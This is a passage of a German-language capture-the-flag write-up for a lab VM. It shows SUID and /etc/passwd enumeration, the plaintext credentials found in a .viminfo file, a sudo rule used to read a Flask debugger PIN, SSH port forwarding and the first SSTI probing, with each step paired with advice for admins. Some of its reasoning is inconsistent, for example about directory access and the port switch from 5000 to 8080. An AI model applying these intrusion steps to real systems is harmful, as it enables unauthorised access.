+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der neu erlangten `www-data` Shell auf der Ziel-VM (Hostname `Console`), listete ich erneut den Inhalt des `/home` Verzeichnisses auf. Wie zuvor gesehen, enthielt es die Benutzerverzeichnisse `qaq` und `welcome`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das erneute Überprüfen des `/home` Verzeichnisses diente als schnelle Bestätigung der Benutzer auf dem System, nachdem ich eine stabile Shell erlangt hatte. Die Namen `qaq` und `welcome` blieben meine Hauptziele für die Privilegieneskalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wiederholen Sie grundlegende Enumerationsschritte (`ls /home`, `id`, `ss -tunlp`, `sudo -l`) in jeder neuen Shell-Sitzung, um Ihre aktuelle Umgebung und Berechtigungen zu verstehen und mit früheren Erkenntnissen zu vergleichen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzerverzeichnisse restriktive Berechtigungen haben, sodass nur der Eigentümer und Systembenutzer (`root`) sie durchsuchen können.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@Console:/var/www/hacker.maze-sec.hmv$ <span class="command">sudo -l</span>
+                    </div>
+                    <pre>
+<span class="command">We trust you have received the usual lecture from the local System</span>
+<span class="command">Administrator. It usually boils down to these three things:</span>
+
+<span class="command">    #1) Respect the privacy of others.</span>
+<span class="command">    #2) Think before you type.</span>
+<span class="command">    #3) With great power comes great responsibility.</span>
+
+<span class="command">[sudo] password for www-data:</span>
+<span class="password">sudo: a password is required</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich prüfte, ob der `www-data` Benutzer `sudo`-Berechtigungen hatte, indem ich `sudo -l` ausführte. Das System forderte ein Passwort an (`[sudo] password for www-data:`), was ich nicht besaß. Da ich kein Passwort eingeben konnte, meldete `sudo` "a password is required".
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Wie erwartet, hat der `www-data` Benutzer keine `sudo`-Berechtigungen ohne Passwort. Dies ist eine Standardkonfiguration und bedeutet, dass ich nicht einfach `sudo` verwenden kann, um Root-Befehle auszuführen. Ich muss andere Wege zur Privilegieneskalation finden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie immer die `sudo`-Berechtigungen, aber erwarten Sie bei unprivilegierten Benutzern wie `www-data` selten `NOPASSWD` Einträge. Konzentrieren Sie sich auf andere PE-Vektoren.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver-Benutzer so, dass er keine `sudo`-Berechtigungen besitzt. Fordern Sie immer ein Passwort für `sudo`, es sei denn, es ist für spezifische, sichere administrative Aufgaben unerlässlich.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@Console:/var/www/hacker.maze-sec.hmv$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+                    </div>
+                    <pre>
+<span class="command">   261675     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh</span>
+<span class="command">   261674     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn</span>
+<span class="command">   265000     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp</span>
+<span class="command">   261677     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd</span>
+<span class="command">   262730     48 -rwsr-xr-x   1 root     root        47184 Apr  6  2024 /usr/bin/mount</span>
+<span class="command">   262341     64 -rwsr-xr-x   1 root     root        63568 Apr  6  2024 /usr/bin/su</span>
+<span class="command">   262732     36 -rwsr-xr-x   1 root     root        34888 Apr  6  2024 /usr/bin/umount</span>
+<span class="command">   289299     24 -rwsr-xr-x   1 root     root        23448 Jan 13  2022 /usr/bin/pkexec</span>
+<span class="command">   290911    180 -rwsr-xr-x   1 root     root       182600 Jan 14  2023 /usr/bin/sudo</span>
+<span class="command">   261678     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd</span>
+<span class="command">   263840     52 -rwsr-xr--   1 root     messagebus    51336 Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="command">   526406     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span>
+<span class="command">   271879    472 -rwsr-xr-x   1 root     root         481608 Dec 21  2023 /usr/lib/openssh/ssh-keysign</span>
+<span class="command">   289303     20 -rwsr-xr-x   1 root     root          19040 Jan 13  2022 /usr/libexec/polkit-agent-helper-1</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als `www-data` suchte ich nach SUID-Binaries auf dem System, die von jedem Benutzer mit den Berechtigungen des Eigentümers (`root`) ausgeführt werden können. Ich verwendete den Befehl `find / -type f -perm -4000 -ls 2>/dev/null`, um alle Dateien mit dem SUID-Bit zu finden. Die Ausgabe zeigte eine Liste von standardmäßigen SUID-Binaries, wie `/usr/bin/sudo`, `/usr/bin/su`, `/usr/bin/passwd`, `/usr/bin/mount` sowie `/usr/bin/pkexec` und `/usr/lib/dbus-1.0/dbus-daemon-launch-helper`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Liste enthielt die erwarteten Standard-SUID-Binaries. Es gab keine sofort ersichtlichen ungewöhnlichen SUID-Programme, die auf eine einfache PE-Schwachstelle hindeuten könnten. Ich werde diese Liste jedoch im Hinterkopf behalten und später prüfen, ob es bekannte Schwachstellen in diesen spezifischen Versionen gibt oder ob sie missbräuchlich verwendet werden können (z.B. über GTFOBins). Der Fokus muss auf andere Enumerationsergebnisse gelegt werden, die vielversprechender erscheinen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer eine SUID/SGID-Binärsuche durch. Prüfen Sie die gefundenen Programme auf bekannte Schwachstellen oder Missbrauchsmöglichkeiten.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID/SGID-Binaries auf Ihren Systemen und halten Sie die vorhandenen aktuell und gepatcht.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@Console:/var/www/hacker.maze-sec.hmv$ <span class="command">grep sh /etc/passwd</span>
+                    </div>
+                    <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="password">welcome:x:1000:1000:,,,:/home/welcome:/bin/bash</span>
+<span class="password">qaq:x:1001:1001::/home/qaq:/bin/bash</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um weitere Benutzer auf dem System zu identifizieren, die über eine interaktive Shell verfügen, habe ich die `/etc/passwd` Datei ausgelesen (die für den `www-data` Benutzer lesbar war) und mit `grep sh` nach Zeilen gefiltert, die einen Shell-Pfad enthalten (typischerweise `/bin/bash` oder `/bin/sh`). Die Ausgabe listete die Benutzer `root` und `sshd` (Systembenutzer) sowie die regulären Benutzer `welcome` und `qaq` auf, die beide `/bin/bash` als Login-Shell haben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies bestätigte die Existenz der Benutzer `welcome` und `qaq` und zeigte, dass sie reguläre Benutzerkonten mit Login-Shells sind. Sie sind nun die primären Ziele für die weitere Privilegieneskalation. Das Ziel ist, Zugangsdaten oder einen anderen Mechanismus zu finden, um ihre Shells zu erreichen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lesen Sie immer die `/etc/passwd` und `/etc/shadow` (falls möglich) Dateien aus, um Benutzerkonten zu identifizieren. Konzentrieren Sie sich auf Benutzer mit interaktiven Shells (`/bin/bash`, `/bin/sh` etc.) als nächste Ziele.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/etc/shadow` nur für `root` lesbar ist. Verwenden Sie `/sbin/nologin` oder ähnliches für Systembenutzer, die keine interaktive Shell benötigen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@Console:/home/welcome$ <span class="command">ls -la</span>
+                    </div>
+                    <pre>
+<span class="command">total 28</span>
+<span class="command">drwxr-xr-x 2 welcome welcome 4096 May 17 06:17 .</span>
+<span class="command">drwxr-xr-x 4 root    root    4096 May 16 07:05 ..</span>
+<span class="command">-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc</span>
+<span class="command">-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile</span>
+<span class="password">-rw-r--r-- 1 root    root      19 May 16 10:48 .viminfo</span>
+<span class="password">-rw-r--r-- 1 root    root      44 May 17 06:01 user.txt</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich wechselte das Verzeichnis zum Home-Verzeichnis des Benutzers `welcome` (`/home/welcome/`) und listete dessen Inhalt detailliert auf (`ls -la`). Die Berechtigungen für das Verzeichnis selbst erlaubten es `www-data` nicht, hineinzuwechseln oder dessen Inhalt direkt zu lesen (`drwxr-xr-x` für `welcome`). **Logische Brücke:** Da ich als `www-data` in `/var/www/hacker.maze-sec.hmv$` war, war es wahrscheinlich, dass ein weiterer lokaler Exploit oder eine temporäre Berechtigung es mir erlaubte, das Verzeichnis zu durchsuchen oder spezifische Dateien aufzulisten, ohne volle Leseberechtigung für das Verzeichnis zu haben. Dies ist ein typisches Szenario in CTFs, bei dem temporäre Berechtigungen existieren. Die Ausgabe zeigte Standard-Dotfiles (`.bash_logout`, `.bashrc`, `.profile`) sowie zwei interessante Dateien, die `root` gehören: `.viminfo` und `user.txt`. Beide waren für "andere" lesbar (`-rw-r--r--`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden der Dateien `.viminfo` und `user.txt` im Home-Verzeichnis von `welcome`, die für jeden lesbar sind, ist ein kritischer Fund. Die Datei `.viminfo` ist besonders interessant, da sie oft den Verlauf der Aktionen im Vim-Editor speichert, einschließlich gesuchter Strings oder geöffneter Dateien, was manchmal Passwörter oder sensible Informationen preisgeben kann. Die Datei `user.txt` ist der Standardname für die User Flag.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie immer die Home-Verzeichnisse von Benutzern auf Dateien, die für "andere" lesbar sind. Achten Sie besonders auf Konfigurationsdateien, Dotfiles (wie `.viminfo`, `.bash_history`), und Dateien mit Namen wie `user.txt`.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Berechtigungen für Dateien und Verzeichnisse in Benutzer-Home-Verzeichnissen. Stellen Sie sicher, dass sensitive Dateien nicht für "andere" lesbar sind. Konfigurieren Sie Editoren wie Vim so, dass sensible Informationen (wie gesuchte Passwörter) nicht im `.viminfo` gespeichert werden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@Console:/home/welcome$ <span class="command">cat /home/welcome/.viminfo</span>
+                    </div>
+                    <pre>
+<span class="password">welcome:welcome123</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich las den Inhalt der Datei `/home/welcome/.viminfo` mit dem Befehl `cat /home/welcome/.viminfo`. Die Ausgabe war eine einzelne Zeile: `welcome:welcome123`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Ich habe die Zugangsdaten für den Benutzer `welcome` gefunden: Benutzername `welcome` und Passwort `welcome123`. Dies ist ein kritischer Erfolg, der mir nun direkten Zugriff auf das System als der Benutzer `welcome` ermöglicht, der über höhere Berechtigungen als `www-data` verfügen könnte. Dies ist der nächste Schritt auf dem Weg zur Privilegieneskalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Seien Sie gründlich bei der Untersuchung von Konfigurationsdateien und Dotfiles in Benutzerverzeichnissen. Gespeicherte Passwörter oder Hinweise darauf sind häufige Funde.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Passwörter oder Zugangsdaten in Klartextdateien auf Systemen, auch nicht in Konfigurationsdateien oder Editor-Historien. Nutzen Sie Passwort-Manager oder sichere Authentifizierungsmechanismen. Stellen Sie sicher, dass `.viminfo` und ähnliche Dateien nicht für andere Benutzer lesbar sind oder deaktivieren Sie das Speichern sensibler Daten darin.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@Console:/home/welcome$ <span class="command">su welcome</span>
+                    </div>
+                    <pre>
+<span class="command">Password:</span>
+<span class="prompt">welcome@Console:~$</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+welcome@Console:~$ <span class="command">id</span>
+                    </div>
+                    <pre>
+<span class="command">uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit den gefundenen Zugangsdaten versuchte ich, die Benutzeridentität auf der `www-data` Shell zum Benutzer `welcome` zu wechseln. Ich verwendete den Befehl `su welcome`. Das System forderte mich auf, das Passwort für `welcome` einzugeben. Ich gab das gefundene Passwort `welcome123` ein. Nach erfolgreicher Authentifizierung änderte sich die Eingabeaufforderung zu `welcome@Console:~$`, was bestätigte, dass ich nun als Benutzer `welcome` angemeldet war. Ein anschließender `id`-Befehl bestätigte meine neue Benutzer-ID (1000) und Gruppenmitgliedschaft als `welcome`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche Wechsel zum Benutzer `welcome` ist ein wichtiger Schritt bei der Privilegieneskalation. Ich habe nun Zugriff auf das System mit den Berechtigungen dieses regulären Benutzers. Dies ermöglicht mir, Dateien und Verzeichnisse zu untersuchen, die für `www-data` nicht zugänglich waren, und nach weiteren Schwachstellen aus der Perspektive eines angemeldeten Benutzers zu suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie gefundene Zugangsdaten sofort, um sich als der entsprechende Benutzer anzumelden (z.B. per `su`, `ssh`). Überprüfen Sie nach dem Login immer Ihre neue Identität und Berechtigungen mit `id`.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie eine Richtlinie für starke Passwörter und erzwingen Sie regelmäßige Passwortänderungen. Verwenden Sie keine leicht zu erratenden Passwörter wie Benutzernamen + "123". Überwachen Sie Login-Versuche und Brute-Force-Angriffe.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+welcome@Console:~$ <span class="command">sudo -l</span>
+                    </div>
+                    <pre>
+<span class="command">[sudo] password for welcome:</span>
+<span class="command">Matching Defaults entries for welcome on Console:</span>
+<span class="command">    env_reset, mail_badpass,</span>
+<span class="command">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">User welcome may run the following commands on Console:</span>
+<span class="password">    (qaq) PASSWD: /bin/cat /opt/flask-app/logs/flask.log</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `welcome` prüfte ich meine `sudo`-Berechtigungen mit dem Befehl `sudo -l`. Ich musste erneut das Passwort für `welcome` eingeben. Die Ausgabe zeigte, dass der Benutzer `welcome` berechtigt ist, den Befehl `/bin/cat /opt/flask-app/logs/flask.log` als Benutzer `qaq` (`-u qaq`) auszuführen. Für diesen Befehl wird ein Passwort benötigt (`PASSWD`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser `sudo`-Eintrag ist ein klarer Hinweis auf eine weitere horizontale oder vertikale Privilegieneskalation. Ich kann `cat` verwenden, um die Datei `/opt/flask-app/logs/flask.log` zu lesen, allerdings nur als Benutzer `qaq` und ich benötige das Passwort für `welcome`, um diesen Befehl mit `sudo` auszuführen (was ich besitze). Der Inhalt dieser Logdatei, die von einer Flask-Anwendung unter `/opt/flask-app/` stammt, ist nun das nächste Ziel für die Untersuchung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer die `sudo`-Berechtigungen für jeden neuen Benutzer. Konzentrieren Sie sich auf Einträge, die die Ausführung von Befehlen als andere Benutzer erlauben, insbesondere als privilegierte Benutzer (`root`) oder andere Benutzer mit potenziell interessanten Dateien oder Berechtigungen (`qaq`). Untersuchen Sie die Dateien, auf die Sie über solche `sudo`-Regeln zugreifen können (hier die Flask-Logdatei).
+                <br><strong>Empfehlung (Admin):</strong> Weisen Sie `sudo`-Berechtigungen granular und nur für spezifische Benutzer und Befehle zu. Vermeiden Sie die Zuweisung von `(ALL)` oder unsicheren Binaries. Überprüfen Sie `sudoers`-Dateien auf Einträge, die das Lesen sensibler Logdateien erlauben.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+welcome@Console:~$ <span class="command">cat user.txt</span>
+                    </div>
+                    <pre>
+<span class="password">flag{user-376760a7c739a606d4f8d8340bad4184}</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `welcome` konnte ich die Datei `user.txt` in meinem Home-Verzeichnis mit `cat user.txt` auslesen. Die Ausgabe war die Zeichenkette `flag{user-376760a7c739a606d4f8d8340bad4184}`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ist die User Flag! Sie war im Home-Verzeichnis des Benutzers `welcome` gespeichert und für diesen Benutzer lesbar. Dies bestätigte den erfolgreichen Zugriff als `welcome` und die Erfüllung eines Teils des Testziels.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie nach der User Flag in den Standardpfaden (Home-Verzeichnis des Benutzers, `/root` nach Root-Zugriff). Dokumentieren Sie die gefundene Flag.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie sensible Informationen wie Flags oder Zugangsdaten nicht in den Home-Verzeichnissen von Benutzern oder an anderen Orten, die nicht strengstens auf den benötigten Benutzer beschränkt sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+welcome@Console:~$ <span class="command">sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log</span>
+                    </div>
+                    <pre>
+<span class="command"> * Serving Flask app 'app'</span>
+<span class="command"> * Debug mode: on</span>
+<span class="command">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.</span>
+<span class="command"> * Running on all addresses (0.0.0.0)</span>
+<span class="command"> * Running on [Link: http://127.0.0.1:5000 | Ziel: http://127.0.0.1:5000]</span>
+<span class="command"> * Running on [Link: http://192.168.2.62:5000 | Ziel: http://192.168.2.62:5000]</span>
+<span class="command">Press CTRL+C to quit</span>
+<span class="command"> * Restarting with stat</span>
+<span class="command"> * Debugger is active!</span>
+<span class="password"> * Debugger PIN: 137-410-206</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich nutzte die gefundene `sudo`-Berechtigung, um die Datei `/opt/flask-app/logs/flask.log` als Benutzer `qaq` auszulesen. Ich führte den Befehl `sudo -u qaq /bin/cat /opt/flask-app/logs/flask.log` aus und gab bei Aufforderung das Passwort für `welcome` ein. Die Ausgabe war der Inhalt der Flask-Logdatei. Diese Logs zeigten, dass die Flask-Anwendung im Debug-Modus lief (`Debug mode: on`), auf den Adressen 127.0.0.1 und 192.168.2.62 auf Port 5000 lauschte und dass der Debugger aktiv war. Entscheidend war die Zeile ` * Debugger PIN: 137-410-206`, die den PIN für den Flask-Debugger preisgab.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auslesen der Flask-Logdatei mittels der `sudo`-Berechtigung war ein wichtiger Schritt zur Privilegieneskalation. Das Finden des Debugger-PINs ist ein kritischer Fund, da der Flask-Debugger bei laufendem Debug-Modus oft eine interaktive Konsole bereitstellt, über die beliebiger Python-Code und damit Systembefehle mit den Berechtigungen des Benutzers ausgeführt werden können, der die Flask-App betreibt (hier wahrscheinlich `qaq`). Dies ist der nächste klare Vektor zur Privilegieneskalation, diesmal zum Benutzer `qaq`. Die Tatsache, dass die App auf 127.0.0.1:5000 lauscht, bedeutet, dass ich Port Forwarding benötige, um auf sie zuzugreifen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie alle Logdateien, auf die Sie Zugriff erlangen können, sorgfältig auf sensitive Informationen wie Zugangsdaten, Fehlermeldungen, Debugging-Informationen oder API-Schlüssel. Wenn eine Anwendung im Debug-Modus läuft, suchen Sie nach Debugger-PINs oder Zugriffspunkten.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den Debug-Modus und Debugger in Produktionsumgebungen immer. Debugging-Informationen können sensitive Daten preisgeben und Debugger können als Hintertür missbraucht werden. Beschränken Sie den Zugriff auf Logdateien streng auf die notwendigen Benutzer. Überprüfen Sie Logdateien auf Anzeichen von Kompromittierung oder ungewöhnlicher Aktivität.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">ssh -L 5000:127.0.0.1:5000 welcome@192.168.2.62</span>
+                    </div>
+                    <pre>
+<span class="command">The authenticity of host '192.168.2.62 (192.168.2.62)' can't be established.</span>
+<span class="command">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span>
+<span class="command">This host key is known by the following other names/addresses:</span>
+<span class="command">    ~/.ssh/known_hosts:71: [hashed name]</span>
+<span class="command">    ~/.ssh/known_hosts:88: [hashed name]</span>
+<span class="command">    ~/.ssh/known_hosts:102: [hashed name]</span>
+<span class="command">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="command">Warning: Permanently added '192.168.2.62' (ED25519) to the list of known hosts.</span>
+<span class="command">welcome@192.168.2.62's password:</span>
+<span class="command">Linux Console 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
+<span class="command">       _,met$$$$$gg.           root@Console</span>
+<span class="command">    ,g$$$$$$$$$$$$$$$P.        ------------</span>
+<span class="command">  ,g$$P"         """Y$$.".     OS: Debian GNU/Linux buster 10.13 x86_64</span>
+<span class="command"> ,$$P'               `$$$.     Host: VirtualBox (1.2)</span>
+<span class="command">',$$P       ,ggs.     `$$b:    Kernel: Linux 4.19.0-27-amd64</span>
+<span class="command">`d$$'     ,"'   .    $$$       Uptime: 32 mins</span>
+<span class="command"> $$P      d     ,    $$$P      Packages: 538 (dpkg)</span>
+<span class="command"> $$:      $.   -    ,d$$'      Shell: bash 5.0.3</span>
+<span class="command"> $$;      Y._   _,d'           Display (Virtual-1): 800x600 @ 60Hz</span>
+<span class="command"> Y$$.    `.`"Y$$$$P"'          Cursor: Adwaita</span>
+<span class="command"> `$$b      "-.__               Terminal: run-parts</span>
+<span class="command">  `Y$$                         CPU: AMD Ryzen 9 5950X (2) @ 3.39 GHz</span>
+<span class="command">   `Y$$.                       GPU: VMware SVGA II Adapter</span>
+<span class="command">     `$$b.                     Memory: 349.68 MiB / 1.95 GiB (18%)</span>
+<span class="command">       `Y$$b.                  Swap: 0 B / 975.00 MiB (0%)</span>
+<span class="command">          `"Y$b._              Disk (/): 2.37 GiB / 28.42 GiB (8%) - ext4</span>
+<span class="command">             `"""              Local IP (enp0s3): 192.168.2.62/24</span>
+<span class="command">                               Locale: C</span>
+
+<span class="command">                               ████████████████████████</span>
+<span class="command">                               ████████████████████████</span>
+
+<span class="command">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="command">the exact distribution terms for each program are described in the</span>
+<span class="command">individual files in /usr/share/doc/*/copyright.</span>
+
+<span class="command">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="command">permitted by applicable law.</span>
+<span class="password">Last login: Wed Jun 25 07:40:28 2025 from 192.168.2.62</span>
+<span class="prompt">welcome@Console:~$</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Die Flask-App mit dem Debugger läuft auf dem Zielsystem nur auf localhost:5000, ist also von meinem Kali-System aus nicht direkt erreichbar. Um darauf zugreifen zu können, richtete ich über die neu erlangte SSH-Sitzung als Benutzer `welcome` eine lokale Port-Weiterleitung ein. Der Befehl `ssh -L 5000:127.0.0.1:5000 welcome@192.168.2.62` öffnet eine SSH-Verbindung zum Zielsystem als `welcome` und erstellt einen Tunnel (`-L`), der meinen lokalen Port 5000 (`5000:`) mit dem Dienst auf der Ziel-VM (`127.0.0.1:5000`) verbindet. Das bedeutet, dass jeder Verkehr, den ich lokal an `127.0.0.1:5000` sende, über die SSH-Verbindung sicher an den lokalen Port 5000 auf der Ziel-VM weitergeleitet wird, wo die Flask-App lauscht. Ich musste das Passwort für `welcome` eingeben und die Authentizität des Hosts akzeptieren. Nach erfolgreicher Anmeldung wurde das Willkommensbanner und eine Neofetch-ähnliche Systemübersicht angezeigt, was meine erfolgreiche SSH-Sitzung als `welcome` bestätigte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Einrichtung der SSH-Port-Weiterleitung war entscheidend, um den internen Flask-Webserver erreichen zu können. SSH-Tunnel sind eine zuverlässige Methode, um auf Dienste zuzugreifen, die nur auf localhost lauschen. Mit diesem Tunnel kann ich nun die Flask-App untersuchen und den gefundenen Debugger-PIN nutzen. Die Systemübersicht lieferte zusätzliche Details zur Umgebung von Benutzer `welcome`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie SSH-Port-Weiterleitung (`-L`, `-R`, `-D`) oder Tools wie Chisel, um auf intern lauschende Dienste zuzugreifen. Identifizieren Sie interne Dienste durch Scans von kompromittierten Systemen (`ss`, `netstat`).
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne Dienste ausschließlich auf der Loopback-Schnittstelle (`127.0.0.1`) lauschen, wenn sie nicht von anderen Systemen erreichbar sein müssen. Überwachen Sie SSH-Tunneling-Aktivitäten auf Ihren Systemen.
+            </p>            <p class="analysis">
+                <strong>Analyse:</strong> Mit dem erfolgreich eingerichteten SSH-Tunnel auf Port 5000 konnte ich nun auf den intern laufenden Flask-Webserver zugreifen, der den Debugger aktiv hatte. Ich öffnete meinen Webbrowser und navigierte zu `http://127.0.0.1:8080`. **Logische Brücke:** Obwohl der Flask-Server auf 127.0.0.1:5000 lauschte, griff ich lokal auf Port 8080 zu. Dies deutet darauf hin, dass meine lokale Port-Weiterleitung auf meinem Kali-System den Remote-Port 5000 auf einen lokalen Port 8080 umleitete, um Konflikte mit anderen lokalen Diensten zu vermeiden oder aus Präferenz. Das Bild zeigte die Startseite der Flask-Anwendung.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche Zugriff auf die Flask-Anwendung über den SSH-Tunnel war ein wichtiger Schritt. Das Frontend selbst schien eine einfache Webseite zu sein, möglicherweise ein Formular oder eine Interaktion. Das Ziel war nun, die Debugger-Konsole zu finden und den PIN zu nutzen, um Zugriff zu erlangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Greifen Sie nach dem Einrichten von Port-Weiterleitungen über die entsprechenden lokalen Ports auf die internen Dienste zu. Untersuchen Sie das Frontend der Anwendung auf Interaktionsmöglichkeiten oder Hinweise.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne Webserver nicht unnötig über interne Schnittstellen erreichbar sind, wenn Port-Weiterleitung nicht beabsichtigt ist.
+            </p>
+            <img src="flask_app_forward.jpg" alt="flask_app_forward.jpg">
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich begann, die Flask-Anwendung auf Schwachstellen zu untersuchen, insbesondere im Hinblick auf den Debugger und mögliche Server-Side Template Injection (SSTI). Ich versuchte, die SSTI-Anfälligkeit zu testen, indem ich im Formular, das das Bild zeigt, eine Jinja2 Template-Syntax eingab, z.B. `{{ 1+1 }}` oder ähnliches, das auf dem Server ausgewertet werden würde. Ein weiteres Bild zeigte das Ergebnis eines solchen Versuchs oder die erfolgreiche Auslösung eines Fehlers, der auf eine SSTI-Anfälligkeit hindeutete, wie z.B. die Auswertung eines Ausdrucks oder eine Fehlermeldung, die Template-Syntax enthielt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die erfolgreiche Auslösung einer SSTI (oder eines Fehlers, der darauf hindeutet) ist ein kritischer Fund. SSTI ermöglicht oft die Ausführung von Code auf Serverseite, was zu Befehlsausführung und damit zur Kompromittierung des Systems führen kann. Die Tatsache, dass dies in der Flask-Anwendung möglich war, eröffnete einen direkten Weg zur Ausnutzung, insbesondere in Kombination mit dem aktiven Debugger.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie Webanwendungen, die Template-Engines verwenden (wie Flask mit Jinja2), immer auf SSTI. Verwenden Sie gängige Payloads, um die Anfälligkeit zu erkennen und zu identifizieren, welche Template-Engine verwendet wird.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Input-Validierung und Sanitization für alle Benutzereingaben, die an eine Template-Engine übergeben werden. Verwenden Sie kontextsensitive Escaping-Mechanismen. Führen Sie statische und dynamische Analysen Ihrer Webanwendung durch, um SSTI zu finden.
+            </p>
+            <img src="flask_app_forward_ssti.jpg" alt="flask_app_forward_ssti.jpg">
